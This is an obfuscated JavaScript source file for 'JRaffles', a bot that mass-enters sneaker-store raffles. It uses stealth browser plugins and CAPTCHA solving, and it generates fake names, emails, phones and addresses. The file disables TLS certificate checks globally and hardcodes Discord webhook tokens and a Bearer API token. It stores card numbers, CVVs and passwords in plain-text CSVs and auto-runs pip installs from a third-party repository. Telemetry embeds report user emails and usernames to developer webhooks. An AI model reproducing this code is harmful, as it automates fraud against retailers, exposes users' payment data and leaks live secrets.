process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x190b67 = require('fs'), _0x14a8f9 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x149519(_0x15bb83) {
    const _0x4683ac = _0x190b67['createWriteStream'](_0x15bb83, { 'flags': 'a' }), _0x23c85d = console['log'];
    console['log'] = function () {
        const _0x2eedb = Array['prototype']['slice']['call'](arguments), _0xbf233d = _0x2eedb['join']('\x20') + '\x0a';
        _0x4683ac['write'](_0xbf233d), _0x23c85d['apply'](console, _0x2eedb);
    };
}
_0x149519('../logs/log\x20' + _0x14a8f9);
var _0x396ced = require('tough-cookie'), _0x548918 = require('node-imap'), _0x32617b = require('util')['inspect'];
const _0x26bd25 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x71fa02 } = require('discord.js');
var _0x548d4e = require('exe');
const { execFile: _0x5b59be } = require('child_process'), _0x586b7d = require('puppeteer-extra'), _0x47e099 = require('cross-spawn'), _0x1c4286 = require('puppeteer-extra-plugin-recaptcha'), _0x41ab99 = require('puppeteer-extra-plugin-stealth'), _0x136200 = require('chalk'), _0x3aeb59 = require('node-bash-title'), _0x212bbb = require('axios'), _0x32de35 = require('papaparse');
var _0x847023 = require('random-name');
const _0x147a50 = require('request');
var _0x136b91 = require('prompt');
const _0x2a4e9a = _0x147a50['jar']();
var _0x120b49 = {};
const _0x4a515a = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x2d1699 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x314eac = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x2a0d6b = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x5e2daa = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x1e0bbc = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0xb7a73a = 'https://discord.com/api/webhooks/', _0x5919d2 = '' + _0xb7a73a + _0x314eac, _0x40cc05 = '' + _0xb7a73a + _0x2a0d6b, _0x1f56e1 = '' + _0xb7a73a + _0x4a515a, _0x32737e = '' + _0xb7a73a + _0x2d1699, _0x442434 = '' + _0xb7a73a + _0x5e2daa, _0x3fb3ca = '' + _0xb7a73a + _0x1e0bbc;
const _0x22bb5e = JSON['parse'](_0x190b67['readFileSync']('country.json', 'utf-8')), _0x4ff5ce = JSON['parse'](_0x190b67['readFileSync']('../package.json', 'utf-8')), _0x3e659f = _0x4ff5ce['version'];
var _0x242415, _0x38de08, _0x14b960, _0x426cfd, _0x3e6089, _0x8f3d6b, _0x380ae8, _0x20e49a;
const _0x4e4355 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x2de72e = ![];
const _0x2db1d7 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x46c5cf = '0123456789';
var _0x57758d = _0x2db1d7['split']('');
const _0x32b8e2 = require('auto-git-update'), _0x200052 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x2e6e40 = new _0x32b8e2(_0x200052);
async function _0x35c377() {
    _0x3e6089 = _0x190b67['readdirSync']('../proxies'), _0x426cfd = _0x190b67['readdirSync']('../tasks'), !_0x190b67['existsSync']('../accounts/fenom.csv') && _0x190b67['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x190b67['existsSync']('../accounts/paypal.csv') && _0x190b67['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x190b67['existsSync']('../accounts/bstn.csv') && _0x190b67['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x190b67['existsSync']('../accounts/eql.csv') && _0x190b67['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x190b67['existsSync']('../failed-tasks.csv') && _0x190b67['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x190b67['existsSync']('../successful-tasks.csv') && _0x190b67['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x120b49 = JSON['parse'](_0x190b67['readFileSync']('../settings.json', 'utf-8')), !_0x120b49['delay'] && (_0x120b49['delay'] = 0x3c, _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49, null, 0x2))), !_0x120b49['threads'] && (_0x120b49['threads'] = 0x1, _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49, null, 0x2))), !_0x120b49['python'] && (_0x47e099('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20-r\x20modules/Confirmed/requirements.txt'
    ], { 'shell': !![] }), _0x47e099('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20git+https://github.com/66niko99/py-adyen-encrypt.git'
    ], { 'shell': !![] }), _0x120b49['python'] = 'uptodate', _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49, null, 0x2))), !_0x120b49['masterMail'] && (_0x120b49['masterMail'] = 'yourmail@gmail.com', _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49, null, 0x2))), !_0x120b49['CapSolver'] && (_0x120b49['CapSolver'] = 'yourkeyhere', _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49, null, 0x2))), !_0x120b49['masterPassword'] && (_0x120b49['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49, null, 0x2))), !_0x120b49['captchaKey'] && (_0x120b49['captchaKey'] = '', _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49, null, 0x2))), !_0x120b49['useRandomProxy'] && (_0x120b49['useRandomProxy'] = !![], _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49, null, 0x2))), !_0x120b49['shuffleTasks'] && (_0x120b49['shuffleTasks'] = ![], _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49, null, 0x2))), !_0x120b49['webhook'] && (_0x120b49['webhook'] = '', _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49, null, 0x2))), _0x120b49['delay'] <= 0x1388 && (_0x120b49['delay'] = _0x120b49['delay'] * 0x3e8), _0x120b49['AfewDelay'] && (delete _0x120b49['AfewDelay'], _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49, null, 0x2))), _0x120b49['MahaDelay'] && (delete _0x120b49['MahaDelay'], _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49, null, 0x2))), _0x120b49['footshopDelay'] && (delete _0x120b49['footshopDelay'], _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49, null, 0x2))), _0x120b49['MahaDelay'] = _0x120b49['delay'], _0xb7a73a = _0x120b49['webhook'], _0x8f3d6b = _0x120b49['licenseKey'];
}
let _0x31b24b, _0x4e08b2 = [], _0x15541c;
const _0x2121c3 = _0x49bb9e => new Promise(_0x1ead5f => setTimeout(_0x1ead5f, _0x49bb9e));
function _0x398a3b(_0x121c67, _0x391fd0) {
    return Math['floor'](Math['random']() * (_0x391fd0 - _0x121c67 + 0x1) + _0x121c67);
}
function _0x501569(_0x4478ef) {
    let _0x127978 = _0x4478ef['length'], _0x523d14;
    while (_0x127978 != 0x0) {
        _0x523d14 = Math['floor'](Math['random']() * _0x127978), _0x127978--, [_0x4478ef[_0x127978], _0x4478ef[_0x523d14]] = [
            _0x4478ef[_0x523d14],
            _0x4478ef[_0x127978]
        ];
    }
    return _0x4478ef;
}
async function _0x5b43af(_0x3c6db8) {
    try {
        return _0x212bbb['post']('https://api.whop.com/api/v2/memberships/' + _0x3c6db8 + '/validate_license', { 'metadata': { 'key': '' } }, {
            'headers': {
                'Authorization': 'Bearer\x20DRT4qDTPjhk0dbWMnuTDrMuGiUh6MogGpjZL6gSDoLU',
                'Content-Type': 'application/json'
            }
        });
    } catch (_0x24f4e5) {
        console['log']('Error\x20checking\x20license:\x20' + _0x24f4e5['message']);
    }
}
async function _0x212ea2(_0x4c588a) {
    console['clear']();
    if (_0x4c588a == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x5c4deb = await _0x136b91['get']('License');
        if (_0x5c4deb['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x2121c3(0xbb8), _0x212ea2(_0x4c588a);
        _0x4c588a = _0x5c4deb['License'], _0x120b49['licenseKey'] = _0x4c588a, _0x8f3d6b = _0x4c588a, _0x190b67['writeFileSync']('../settings.json', JSON['stringify'](_0x120b49));
    }
    console['log']('Checking\x20license\x20' + _0x8f3d6b + '...'), await _0x2121c3(0x320);
    const _0x5417f6 = await _0x5b43af(_0x4c588a);
    _0x380ae8 = JSON['stringify'](_0x5417f6['data']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x20e49a = JSON['stringify'](_0x5417f6['data']['discord']['image_url'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x5417f6)
        return console['log']('License\x20not\x20found');
    if (!_0x5417f6['data'])
        return console['log']('License\x20not\x20bound');
    return _0x5417f6['data']['valid'] ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x2de72e = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x2de72e = ![]);
}
async function _0x575b1a() {
    var _0x28fdbc = await _0x136b91['get']('Module');
    return console['clear'](), _0x28fdbc['Module'];
}
;
async function _0x5a7451() {
    var _0x47595d = await _0x136b91['get']('Setting');
    return console['clear'](), _0x47595d['Setting'];
}
async function _0x3b4f03(_0x777183) {
    var _0x2a847a = [];
    for (file of _0x426cfd) {
        var _0x91cd81 = _0x190b67['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x32de35['parse'](_0x91cd81, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x777183['store'] && _0x2a847a['push'](file);
    }
    !_0x2a847a['length'] == 0x0 && (_0x426cfd = _0x2a847a);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x51803c = 0x0; _0x51803c < _0x426cfd['length']; _0x51803c++) {
        console['log']('\x20(' + _0x51803c + ')\x20' + _0x426cfd[_0x51803c]);
    }
    console['log']('');
    var _0x1719c1 = await _0x136b91['get']('Task');
    if (_0x1719c1['Task'] > _0x426cfd['length'] - 0x1 || isNaN(_0x1719c1['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x2121c3(0x3e8), _0x3b4f03();
    var _0xfbe9d2 = _0x190b67['readFileSync']('../tasks/' + _0x426cfd[_0x1719c1['Task']], 'utf-8');
    return _0x14b960 = _0x32de35['parse'](_0xfbe9d2, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x136200['blue'](_0x426cfd[_0x1719c1['Task']])), _0x242415 = _0x426cfd[_0x1719c1['Task']], _0x14b960;
}
async function _0x40f8ee() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x1894ac = 0x0; _0x1894ac < _0x3e6089['length']; _0x1894ac++) {
        console['log']('\x20(' + _0x1894ac + ')\x20' + _0x3e6089[_0x1894ac]);
    }
    console['log']('');
    var _0x4b9379 = await _0x136b91['get']('Proxies');
    if (_0x4b9379['Proxies'] > _0x3e6089['length'] - 0x1 || isNaN(_0x4b9379['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x2121c3(0x3e8), _0x40f8ee();
    var _0x1aca6a = _0x190b67['readFileSync']('../proxies/' + _0x3e6089[_0x4b9379['Proxies']], 'utf-8')['split']('\x0a');
    let _0x205156 = _0x1aca6a['map']((_0x178331, _0xba3bfb) => {
        sanatizeProxy = _0x178331['replace']('\x0d', '');
        if (_0x1aca6a[_0xba3bfb + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x38de08 = _0x3e6089[_0x4b9379['Proxies']], console['clear'](), _0x205156;
}
async function _0x3106d5() {
    var _0x37054a = await _0x136b91['get']('Value');
    return console['clear'](), _0x37054a['Value'];
}
async function _0x92773d(_0x21f404) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x3458ab = 0x0; _0x3458ab < _0x21f404['length']; _0x3458ab++) {
        console['log']('\x20(' + _0x3458ab + ')\x20[' + _0x21f404[_0x3458ab]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x5d049e = await _0x136b91['get']('Module');
    return _0x5d049e['Module'];
}
async function _0x3bcc66() {
    var _0x5c56aa = await _0x136b91['get']('Password');
    return console['clear'](), _0x5c56aa['Password'];
}
;
async function _0x3e4eeb() {
    var _0x28403c = await _0x136b91['get']('Links');
    return _0x28403c['Links'];
}
;
async function _0x5978b3() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x4d4c1b = 0x0; _0x4d4c1b < _0x4e08b2['length']; _0x4d4c1b++) {
        console['log']('\x20(' + _0x4d4c1b + ')\x20' + _0x4e08b2[_0x4d4c1b]);
    }
    ;
    console['log']();
    let _0x4742ba = await _0x136b91['get']('Product');
    return console['clear'](), _0x4742ba['Product'];
}
;
function _0x29f6be() {
    var _0x3cf6b0 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x3cf6b0;
}
;
function _0x1e352c() {
    var _0x7e8e4b = new Date(Date['now']())['toLocaleString']();
    return _0x7e8e4b['replace'](',', '');
}
async function _0x5f1090(_0x104de5, _0x133f54) {
    let _0x22a14a = { 'headers': { 'content-type': 'application/json' } };
    if (_0x3e659f != 'devkey') {
        await _0x212bbb['post'](_0x104de5, _0x133f54, _0x22a14a);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x12b988(_0x1f9cee, _0x3a315a, _0x593cb5, _0x3d8270, _0x193cad) {
    if (!_0x3d8270 && _0x593cb5 == 'dev') {
        var _0xd86bc0 = new _0x71fa02()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x3a315a['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x3a315a['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x1f9cee['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x120b49['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x380ae8,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x1f9cee['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x1f9cee['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x3e659f,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0xd86bc0['data'];
    } else {
        if (_0x3d8270 && _0x593cb5 == 'dev') {
            var _0xd86bc0 = new _0x71fa02()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x3a315a['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x380ae8,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x3a315a['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x1f9cee['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x120b49['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x193cad,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x1f9cee['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x1f9cee['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x3e659f,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0xd86bc0['data'];
        } else {
            if (_0x593cb5 == 'pub') {
                var _0xd86bc0 = new _0x71fa02()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x3a315a['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x3a315a['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x1f9cee['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x120b49['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x1f9cee['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x3e659f,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0xd86bc0['data'];
            } else {
                if (_0x593cb5 == 'acc' && !_0x3d8270) {
                    var _0xd86bc0 = new _0x71fa02()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x3a315a['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x380ae8,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x3a315a['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x120b49['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x3e659f,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0xd86bc0['data'];
                } else {
                    if (_0x593cb5 == 'acc' && _0x3d8270) {
                        var _0xd86bc0 = new _0x71fa02()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x3a315a['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x380ae8,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x193cad,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x3a315a['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x120b49['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x3e659f,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0xd86bc0['data'];
                    } else {
                        if (_0x593cb5 == 'open') {
                            var _0xd86bc0 = new _0x71fa02()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x20e49a)['addFields']({
                                'name': 'User',
                                'value': '' + _0x380ae8,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x3e659f,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0xd86bc0['data'];
                        } else {
                            if (!_0x3d8270 && _0x593cb5 == 'ver') {
                                var _0xd86bc0 = new _0x71fa02()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x3a315a['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x380ae8,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x3a315a['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x120b49['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x3e659f,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0xd86bc0['data'];
                            } else {
                                if (_0x3d8270 && _0x593cb5 == 'ver') {
                                    var _0xd86bc0 = new _0x71fa02()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x3a315a['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x380ae8,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x193cad,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x3a315a['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x120b49['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x3e659f,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0xd86bc0['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x30a360(_0x336ccd, _0x52fd28) {
    var _0x2970be = _0x336ccd[_0x52fd28]['Address1']['split'](''), _0x3689b1 = _0x336ccd[_0x52fd28]['Address2']['split'](''), _0x45a939 = _0x336ccd[_0x52fd28]['Email']['split']('@');
    for (var _0x48a148 = 0x0; _0x48a148 < _0x2970be['length']; _0x48a148++) {
        if (_0x2970be[_0x48a148] == 'X') {
            var _0x16de05 = Math['round'](Math['random']() * (_0x2db1d7['length'] - 0x1));
            _0x2970be[_0x48a148] = _0x57758d[_0x16de05];
        }
    }
    ;
    for (var _0x48a148 = 0x0; _0x48a148 < _0x3689b1['length']; _0x48a148++) {
        if (_0x3689b1[_0x48a148] == 'X') {
            var _0x16de05 = Math['round'](Math['random']() * (_0x2db1d7['length'] - 0x1));
            _0x3689b1[_0x48a148] = _0x57758d[_0x16de05];
        }
    }
    ;
    _0x336ccd[_0x52fd28]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x336ccd[_0x52fd28]['FirstName'] = _0x847023['first']());
    _0x336ccd[_0x52fd28]['LastName']['toUpperCase']() == 'RANDOM' && (_0x336ccd[_0x52fd28]['LastName'] = _0x847023['last']());
    _0x45a939[0x0]['toUpperCase']() == 'RANDOM' ? _0x45a939[0x0] = '' + _0x847023['first']() + _0x847023['last']() + _0x398a3b(0x1, 0x3e7) + '@' : _0x45a939[0x0] = _0x45a939[0x0] + '@';
    _0x336ccd[_0x52fd28]['Email'] = _0x45a939['join'](''), _0x336ccd[_0x52fd28]['Address1'] = _0x2970be['join'](''), _0x336ccd[_0x52fd28]['Address2'] = _0x3689b1['join']('');
    _0x336ccd[_0x52fd28]['Phone'] == 'RANDOM' && (_0x336ccd[_0x52fd28]['Phone'] = '0' + _0x398a3b(0x5f5e100, 0x3b9ac9ff));
    if (_0x336ccd[_0x52fd28]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x366b78 = _0x398a3b(0x1, 0x270f);
        _0x336ccd[_0x52fd28]['Follower'] = '' + _0x847023['first']() + _0x847023['last']() + _0x366b78 + '\x20';
    }
    _0x336ccd[_0x52fd28]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x336ccd[_0x52fd28]['HouseNumber'] = _0x398a3b(0x1, 0xc8));
    if (_0x336ccd[_0x52fd28]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x58c874 = Math['round'](Math['random']() * (_0x2db1d7['length'] - 0x1)), _0x4458f4 = _0x57758d[_0x58c874];
        _0x336ccd[_0x52fd28]['Address1'] = _0x847023['last']() + 'straat', _0x336ccd[_0x52fd28]['Zip'] == '' && (_0x336ccd[_0x52fd28]['Postcode'] = _0x398a3b(0x3e8, 0x270f) + '\x20' + _0x4458f4 + _0x4458f4, _0x336ccd[_0x52fd28]['Zip'] = _0x336ccd[_0x52fd28]['Postcode']), _0x336ccd[_0x52fd28]['HouseNumber'] = '' + _0x398a3b(0x1, 0xc8);
    }
    return;
}
;
async function _0x17abd2(_0x2ab8d5, _0x2a08b7) {
    _0x190b67['appendFileSync']('../failed-tasks.csv', _0x1e352c() + ',' + _0x2a08b7['store'] + ',' + _0x2a08b7['name'] + ',' + _0x2ab8d5['Url'] + ',' + _0x2ab8d5['Size'] + ',' + _0x2ab8d5['Follower'] + ',' + _0x2ab8d5['FirstName'] + ',' + _0x2ab8d5['LastName'] + ',' + _0x2ab8d5['Address1'] + ',' + _0x2ab8d5['Address2'] + ',' + _0x2ab8d5['HouseNumber'] + ',' + _0x2ab8d5['Zip'] + ',' + _0x2ab8d5['City'] + ',' + _0x2ab8d5['State'] + ',' + _0x2ab8d5['Country'] + ',' + _0x2ab8d5['Phone'] + ',' + _0x2ab8d5['Email'] + ',' + _0x2ab8d5['Password'] + ',' + _0x2ab8d5['PaymentMethod'] + ',' + _0x2ab8d5['CardType'] + ',' + _0x2ab8d5['NameOnCard'] + ',' + _0x2ab8d5['CardNumber'] + ',' + _0x2ab8d5['ExpiryDate'] + ',' + _0x2ab8d5['CVV'] + ',' + _0x2ab8d5['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x1ded45(_0x220b95, _0x297690) {
    _0x190b67['appendFileSync']('../successful-tasks.csv', _0x1e352c() + ',' + _0x297690['store'] + ',' + _0x297690['name'] + ',' + _0x220b95['Url'] + ',' + _0x220b95['Size'] + ',' + _0x220b95['Follower'] + ',' + _0x220b95['FirstName'] + ',' + _0x220b95['LastName'] + ',' + _0x220b95['Address1'] + ',' + _0x220b95['Address2'] + ',' + _0x220b95['HouseNumber'] + ',' + _0x220b95['Zip'] + ',' + _0x220b95['City'] + ',' + _0x220b95['State'] + ',' + _0x220b95['Country'] + ',' + _0x220b95['Phone'] + ',' + _0x220b95['Email'] + ',' + _0x220b95['Password'] + ',' + _0x220b95['PaymentMethod'] + ',' + _0x220b95['CardType'] + ',' + _0x220b95['NameOnCard'] + ',' + _0x220b95['CardNumber'] + ',' + _0x220b95['ExpiryDate'] + ',' + _0x220b95['CVV'] + ',' + _0x220b95['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0xcaf21f() {
    let _0x360fb6 = proxyFile['split']('\x0a'), _0x3d2e9b = _0x360fb6['map']((_0x3d9d16, _0x4b66cd) => {
        sanatizeProxy = _0x3d9d16['replace']('\x0d', '');
        if (_0x360fb6[_0x4b66cd + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x3d2e9b;
}
;
async function _0x1c80e5(_0x167265, _0x293519) {
    if (_0x584139 != 'yes')
        var _0x584139 = '', _0x280761 = 0x0;
    async function _0x43f6f3() {
        var _0x51ecc5 = _0x190b67['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x125a9b = _0x32de35['parse'](_0x51ecc5, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
